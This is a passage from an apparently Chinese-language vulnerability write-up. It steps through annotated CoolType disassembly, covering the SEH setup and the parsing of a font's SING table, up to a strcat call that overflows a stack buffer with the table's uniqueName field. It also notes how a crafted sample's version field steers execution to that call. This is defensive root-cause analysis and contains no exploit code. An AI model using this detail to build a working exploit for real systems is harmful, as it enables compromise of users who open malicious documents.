class="comment">; eax=ebp-0xc=0x0012E718-0xc=0x0012E70C(本SEH结构地址)</span></span><br><span class="line">080481CA       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>],<span class="built_in">eax</span>            <span class="comment">; fs:[0] = 0x0012E70C,保存当前SEH结构指针</span></span><br><span class="line">080481D0       <span class="keyword">retn</span>                                <span class="comment">; ret</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">......</span><br><span class="line"><span class="symbol">.text:</span>080DD113 loc_80DD113:                            <span class="comment">; CODE XREF: sub_80DD0B3+5B↑j</span></span><br><span class="line"><span class="symbol">.text:</span>080DD113                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; eax=a2=0x0012E818,[0x0012E818]=0x0494F3E8</span></span><br><span class="line"><span class="symbol">.text:</span>080DD114                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_138]          <span class="comment">; eac=ebp-0x68=0x0012E718-0x68=0x0012E6B0,对象(0x0012E6B0)首地址</span></span><br><span class="line"><span class="symbol">.text:</span>080DD117                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_F0], <span class="number">40000000h</span>     <span class="comment">; [ebp-0x20]=[0x0012E718-0x20]=[0x0012E6F8]=0x40000000</span></span><br><span class="line"><span class="symbol">.text:</span>080DD11E                 <span class="keyword">call</span>    sub_8083452</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">********************************************************************</span><br><span class="line"></span><br><span class="line">        _<span class="built_in">DWORD</span> *__thiscall sub_8083452(_<span class="built_in">DWORD</span> *this, <span class="keyword">int</span> a2)</span><br><span class="line"></span><br><span class="line">********************************************************************</span><br><span class="line"><span class="number">08083452</span>    6A 0C              <span class="keyword">push</span> <span class="number">0xC</span></span><br><span class="line"><span class="number">08083454</span>    B8 0A581708        <span class="keyword">mov</span> <span class="built_in">eax</span>,CoolType.0817580A</span><br><span class="line"><span class="number">08083459</span>    E8 404DFCFF        <span class="keyword">call</span> CoolType.0804819E</span><br><span class="line">0808345E    8BF1               <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">ecx</span>                                      &lt;-----<span class="comment">; esi=ecx=0x0012E6B0,对象(0x0012E6B0)首地址</span></span><br><span class="line"><span class="number">08083460</span>    <span class="number">8975</span> F0            <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="built_in">esi</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">08083489</span>    8B46 <span class="number">14</span>            <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>+<span class="number">0x14</span>]                  <span class="comment">; eax=[esi+0x14]=[0x0012E6C4]=0x049513E0,字体对象</span></span><br><span class="line">0808348C    <span class="number">8946</span> 1C            <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>+<span class="number">0x1C</span>],<span class="built_in">eax</span>                  <span class="comment">; [esi+0x1C]=[0x0012E6CC]=eax=0x049513E0</span></span><br><span class="line">0808348F    C746 <span class="number">20</span> EF330808   <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>+<span class="number">0x20</span>],CoolType.080833EF    &lt;-----<span class="comment">; [esi+0x20]=[0x0012E6B0+0x20]=[0x0012E6D0]=0x080833EF</span></span><br><span class="line"><span class="number">08083496</span>    <span class="number">8976</span> <span class="number">24</span>            <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>+<span class="number">0x24</span>],<span class="built_in">esi</span></span><br><span class="line"><span class="number">08083499</span>    8BC6               <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">esi</span></span><br><span class="line">0808349B    E8 D64DFCFF        <span class="keyword">call</span> CoolType<span class="meta">.08048276</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">***********************************************************************************</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> __cdecl sub_80DD0B3(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, _<span class="built_in">DWORD</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line"></span><br><span class="line">***********************************************************************************</span><br><span class="line">080DD168       <span class="keyword">call</span> CoolType.080151B5              <span class="comment">; 清零0x0012E718后面的一些数据,0x0012E718应该为某个对象的首地址,此函数像是类的构造函数</span></span><br><span class="line">.......</span><br><span class="line">080DD1A3       <span class="keyword">call</span> CoolType.0801605B</span><br><span class="line">080DD1A8       <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x68</span>]     <span class="comment">; esi=[ebp-0x68]=[0x0012E6B0]=0x02137E88</span></span><br><span class="line">080DD1AB       <span class="keyword">neg</span> <span class="built_in">esi</span>                             <span class="comment">; 求补: esi=0xFDEC8178(按位取反再+1),求补操作和求一个数的补码概念是不一样的</span></span><br><span class="line">080DD1AD       <span class="keyword">sbb</span> <span class="built_in">esi</span>,<span class="built_in">esi</span>                         <span class="comment">; 带借位减法:esi=FFFFFFFF</span></span><br><span class="line">080DD1AF       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x48</span>]     <span class="comment">; eax=ebp-0x68=0x0012E718-0x48=0x0012E6D0 ,函数指针地址</span></span><br><span class="line">080DD1B2       <span class="keyword">and</span> <span class="built_in">esi</span>,<span class="built_in">eax</span>                         <span class="comment">; esi=esi and eax=0x0012E6D0 </span></span><br><span class="line">080DD1B4       <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x28</span>],<span class="number">0x1</span>     <span class="comment">; [ebp-0x28]=[0x0012E718-0x28]=[0x0012E6F0]=0x1</span></span><br><span class="line">080DD1B8       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0x3C</span>],<span class="built_in">esi</span>     <span class="comment">; [ebp+0x3C]=[0x0012E754]=esi=0x0012E6D0 &lt;-------这里得到赋值,在这之前[0x0012E6D0]已在sub_8083452()[对象(0x0012E6B0)的构造函数]中得到赋值,[0x0012E6D0]=0x080833EF,0x0012E6D0处的成员变量为函数指针</span></span><br><span class="line">080DD1BB       <span class="keyword">jnz</span> CoolType.080DD2D1               <span class="comment">; 不跳转</span></span><br><span class="line">080DD1C1       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>]</span><br><span class="line">080DD1C4       <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">080DD1C5       <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">080DD1C6       <span class="keyword">push</span> <span class="number">0x2</span></span><br><span class="line">080DD1C8       <span class="keyword">push</span> <span class="built_in">esi</span></span><br><span class="line">080DD1C9       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="built_in">ebx</span></span><br><span class="line">080DD1CC       <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]             <span class="comment">; CoolType.080833EF</span></span><br><span class="line">080DD1CE       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>]</span><br><span class="line">080DD1D1       <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">080DD1D2       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x3C</span>]</span><br><span class="line">080DD1D5       <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">080DD1D6       <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">080DD1D7       <span class="keyword">push</span> <span class="built_in">esi</span></span><br><span class="line">080DD1D8       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="built_in">edi</span></span><br><span class="line">080DD1DB       <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]             <span class="comment">; CoolType.080833EF</span></span><br><span class="line">080DD1DD       <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">0x20</span></span><br><span class="line">080DD1E0       <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="built_in">edi</span></span><br><span class="line">080DD1E3       <span class="keyword">je</span> short CoolType.080DD1F0</span><br><span class="line">080DD1E5       <span class="keyword">push</span> CoolType.081BA878</span><br><span class="line">080DD1EA       <span class="keyword">call</span> CoolType.0809D83E</span><br><span class="line">080DD1EF       <span class="keyword">pop</span> <span class="built_in">ecx</span></span><br><span class="line">080DD1F0       <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>]</span><br><span class="line">080DD1F3       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x3C</span>]</span><br><span class="line">080DD1F6       <span class="keyword">push</span> CoolType.0819D5F8              <span class="comment">; ASCII "ttcf"</span></span><br><span class="line">080DD1FB       <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">080DD1FC       <span class="keyword">call</span> &lt;<span class="keyword">jmp</span>.&amp;MSVCR80.memcmp&gt;</span><br><span class="line">080DD201       <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">0xC</span></span><br><span class="line">080DD204       <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line">080DD206       <span class="keyword">jnz</span> CoolType.080DD2D1               <span class="comment">; 跳转</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line"><span class="symbol">.text:</span>080DD2D1 loc_80DD2D1:                          </span><br><span class="line"><span class="symbol">.text:</span>080DD2D1                              </span><br><span class="line"><span class="symbol">.text:</span>080DD2D1         <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_1E0]</span><br><span class="line"><span class="symbol">.text:</span>080DD2D7         <span class="keyword">call</span>    sub_80172FB</span><br><span class="line"><span class="symbol">.text:</span>080DD2DC         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_E8], <span class="built_in">ebx</span>                       <span class="comment">;   [ebp-0x18]=[0x0012E700]=0x0</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2DF         <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_E8]                       <span class="comment">;   eax=ebp-0x18=0x0012E700</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2E2         <span class="keyword">push</span>    <span class="built_in">eax</span>                                          <span class="comment">; arg_4: [0x0012E5F4]=eax=0x0012E700</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2E3         <span class="keyword">push</span>    <span class="built_in">ebx</span>                                          <span class="comment">; arg_3: [0x0012E5F0]=ebx=0x0</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2E4         <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_1E0]                      <span class="comment">;   eax=ebp-0x110=0x0012E718-0x110=0x0012E608</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EA         <span class="keyword">push</span>    <span class="built_in">eax</span>                                          <span class="comment">; arg_2: [0x0012E5EC]=eax=0x0012E608,对象(0x0012E608)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EB         <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+value1_823A850]               <span class="comment">;   eax=ebp=0x0012E718</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EE         <span class="keyword">push</span>    <span class="built_in">eax</span>                                          <span class="comment">; arg_1: [0x0012E5E8]=0x0012E718,对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EF         <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_D4], <span class="number">4</span>                <span class="comment">; [ebp-0x4]=[0x0012E714]=4</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2F3         <span class="keyword">call</span>    sub_803DCF9      &lt;-------</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">******************************************************************************</span><br><span class="line"></span><br><span class="line">        char __cdecl sub_803DCF9(<span class="keyword">int</span> a1, _<span class="built_in">DWORD</span> *a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span><br><span class="line"></span><br><span class="line">******************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>0803DCF9         <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">; ebp=0x0012E718</span></span><br><span class="line"><span class="symbol">.text:</span>0803DCFA         <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">104h</span>                <span class="comment">; esp=0x0012E4DC,分配局部变量栈空间</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD00         <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>-<span class="number">4</span>]             <span class="comment">; ebp=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD04         <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie  <span class="comment">; eax=0x98C49E84</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD09         <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span>                 <span class="comment">; eax=eax^ebp=0x98D67A5C</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD0B         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_4], <span class="built_in">eax</span>    <span class="comment">; [ebp+0x104] = [0x0012E5DC] = 0x98D67A5C</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD11         <span class="keyword">push</span>    <span class="number">4Ch</span>                      <span class="comment">; [0x0012E4D8]=0x4C(分配栈空间大小)</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD13         <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8184A54  <span class="comment">; eax=0x8184A54(__security_check_cookie)</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD18         <span class="keyword">call</span>    __EH_prolog3_catch       <span class="comment">; [0x0012E4D4]=0x0803DD1D,ret</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line"><span class="symbol">.text:</span>080481D1 __EH_prolog3_catch proc <span class="built_in">near</span>(向栈上写入SEH结构)</span><br><span class="line"></span><br><span class="line">080481D1       <span class="keyword">push</span> <span class="built_in">eax</span>                            <span class="comment">; [0x0012E4D0]=0x8184A54(__security_check_cookie)</span></span><br><span class="line">080481D2       <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>]               <span class="comment">; [0x0012E4CC]=0x0012E70C,指向下一个SEH记录的指针</span></span><br><span class="line">080481D9       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="number">0xC</span>]      <span class="comment">; eax=esp+0xc=0x0012E4CC+0xc=0x0012E4D8</span></span><br><span class="line">080481<span class="built_in">DD</span>       <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="number">0xC</span>]      <span class="comment">; esp=esp-[0x0012E4D8]=0x0012E4CC-0x4C=0x0012E480,再次分配局部变量栈空间</span></span><br><span class="line">080481E1       <span class="keyword">push</span> <span class="built_in">ebx</span>                            <span class="comment">; [0x0012E47C]=ebx=0x0</span></span><br><span class="line">080481E2       <span class="keyword">push</span> <span class="built_in">esi</span>                            <span class="comment">; [0x0012E478]=esi=0x0012E6D0</span></span><br><span class="line">080481E3       <span class="keyword">push</span> <span class="built_in">edi</span>                            <span class="comment">; [0x0012E474]=edi=0x4</span></span><br><span class="line">080481E4       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>],<span class="built_in">ebp</span>          <span class="comment">; [eax]=[0x0012E4D8]=ebp=0x0012E4D8,覆盖传进来的参数0x4C</span></span><br><span class="line">080481E6       <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">eax</span>                         <span class="comment">;</span></span><br><span class="line">080481E8       <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x8230FB8</span>]    <span class="comment">; eax=ds:[0x8230FB8]=0x78FC1194(___security_cookie)</span></span><br><span class="line">080481ED       <span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">ebp</span>                         <span class="comment">; eax=eax^ebp=0x78FC1194^0x0012E4D8=0x78EEF54C</span></span><br><span class="line">080481EF       <span class="keyword">push</span> <span class="built_in">eax</span>                            <span class="comment">; [0x0012E470]=0x78EEF54C</span></span><br><span class="line">080481F0       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="built_in">esp</span>     <span class="comment">; [ebp-0x10]=[0x0012E4D8-0x10]=[0x0012E4C8]=esp=0x0012E470</span></span><br><span class="line">080481F3       <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4</span>]         <span class="comment">; [0x0012E46C]=[ebp-0x4]=[0x0012E4D4]=0x0803DD1D,返回地址</span></span><br><span class="line">080481F6       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4</span>],-<span class="number">0x1</span>     <span class="comment">; [0x0012E4D4]=0xFFFFFFFF,本来的返回地址被修改</span></span><br><span class="line">080481FD       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xC</span>]      <span class="comment">; eax=ebp-0xc=0x0012E4D8-0xc=0x0012E4CC(本SEH结构地址)</span></span><br><span class="line"><span class="number">08048200</span>       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>],<span class="built_in">eax</span>            <span class="comment">; fs:[0] = 0x0012E4CC,保存当前SEH结构指针</span></span><br><span class="line"><span class="number">08048206</span>       <span class="keyword">retn</span>                                <span class="comment">; ret</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line"><span class="symbol">.text:</span>0803DD1D         <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_C]            <span class="comment">; a4: eax=[ebp+0x11c]=[0x0012E5F4]=0x0012E700</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD23         <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_0]            <span class="comment">; a1: edi=[ebp+0x110]=[0x0012E5E8]=0x0012E718,对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD29         <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_4]            <span class="comment">; a2: ebx=[ebp+0x114]=[0x0012E5EC]=0x0012E608,对象(0x0012E608)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD2F         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_130], <span class="built_in">edi</span>          <span class="comment">; [ebp-0x28]=[0x0012E4B0]=edi=0x0012E718</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD32         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_138], <span class="built_in">eax</span>          <span class="comment">; [ebp-0x30]=[0x0012E4A8]=eax=0x0012E700</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD35         <span class="keyword">call</span>    sub_804172C</span><br><span class="line"><span class="symbol">.text:</span>0803DD3A         <span class="keyword">xor</span>     <span class="built_in">esi</span>, <span class="built_in">esi</span>                         <span class="comment">; esi=0x0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD3C         <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>+<span class="number">8</span>], <span class="number">3</span>             <span class="comment">; [edi+8]=[0x0012E720]=0x1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD40         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="built_in">esi</span>          <span class="comment">; [ebp-0x4]=[0x0012E4D8-0x4]=[0x0012E4D4]=0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD43         <span class="keyword">jz</span>      loc_803DF00                      <span class="comment">; 不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD49         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124], <span class="built_in">esi</span>          <span class="comment">; [ebp-0x1c]=[0x0012E4D8-0x1c]=[0x0012E4BC]=0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD4C         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_120], <span class="built_in">esi</span>          <span class="comment">; [ebp-0x18]=[0x0012E4D8-0x18]=[0x0012E4C0]=0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD4F         <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>+<span class="number">0Ch</span>], <span class="number">1</span>           <span class="comment">; [edi+0xc]=[0x0012E718+0xc]=[0x0012E724]=0x1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD53         <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="number">1</span>   <span class="comment">; [ebp-0x4]=[0x0012E4D4]=0x0-&gt;0x1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD57         <span class="keyword">jnz</span>     loc_803DEA9                      <span class="comment">; 不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD5D         <span class="keyword">push</span>    offset aName                     <span class="comment">; "name"</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD62         <span class="keyword">push</span>    <span class="built_in">edi</span>                              <span class="comment">; int</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD63         <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124]</span><br><span class="line"><span class="symbol">.text:</span>0803DD66         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_119], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD6A         <span class="keyword">call</span>    sub_80217D7</span><br><span class="line"><span class="symbol">.text:</span>0803DD6F         <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD72         <span class="keyword">jnz</span>     short loc_803DDDD</span><br><span class="line"><span class="symbol">.text:</span>0803DD74     <span class="keyword">push</span>    offset aSing            <span class="comment">; "SING"</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD79     <span class="keyword">push</span>    <span class="built_in">edi</span>                     <span class="comment">; 类对象指针(0x0012E718),第一个变量为dword_823A850加1之前的值。</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD7A     <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_12C] <span class="comment">; ecx为字体对象,thiscall,ecx传参</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD7D     <span class="keyword">call</span>    sub_8021B06             <span class="comment">; 解析字体对象,处理SING表</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD82     <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_12C] <span class="comment">; eax指向SING表数据</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD85     <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>                <span class="comment">; 判断是否为空</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD85 <span class="comment">;&#125; // starts at 803DD53</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD87 <span class="comment">;try &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD87     <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8B     <span class="keyword">jz</span>      short loc_803DDC4       <span class="comment">; 这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8D     <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>]              <span class="comment">; 字体资源版本号0.1,构造样本时小端写入,这里读出就变成了ecx=0x00010000,使其可以顺利执行到strcat</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8F     <span class="keyword">and</span>     <span class="built_in">ecx</span>, <span class="number">0FFFFh</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD95     <span class="keyword">jz</span>      short loc_803DD9F       <span class="comment">; 这里跳转，jz和je机器码是一样的，IDA识别为jz，OllyDbg识别为je，这里jz感觉好理解一点</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD97     <span class="keyword">cmp</span>     <span class="built_in">ecx</span>, <span class="number">100h</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD9D     <span class="keyword">jnz</span>     short loc_803DDC0</span><br><span class="line"><span class="symbol">.text:</span>0803DD9F</span><br><span class="line"><span class="symbol">.text:</span>0803DD9F loc_803DD9F:                <span class="comment">; CODE XREF: sub_803DCF9+9C↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD9F     <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">10h</span>                       <span class="comment">; 相对SING表入口偏移0x10处找到uniqueName</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA2     <span class="keyword">push</span>    <span class="built_in">eax</span>                            <span class="comment">; char *,strcat源地址入栈，也就是uniqueName起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA3     <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf] <span class="comment">; 这里将ebp的值作为目的地址，也就是前面所分配的缓冲区的起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA6     <span class="keyword">push</span>    <span class="built_in">eax</span>                            <span class="comment">; char *,strcat目的地址入栈</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA7     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf], <span class="number">0</span>   <span class="comment">; 将目标字符串赋值为NULL,空字符串</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDAB     <span class="keyword">call</span>    strcat                         <span class="comment">; 调用strcat函数，造成溢出</span></span><br></pre></td></tr></table></figure></p>
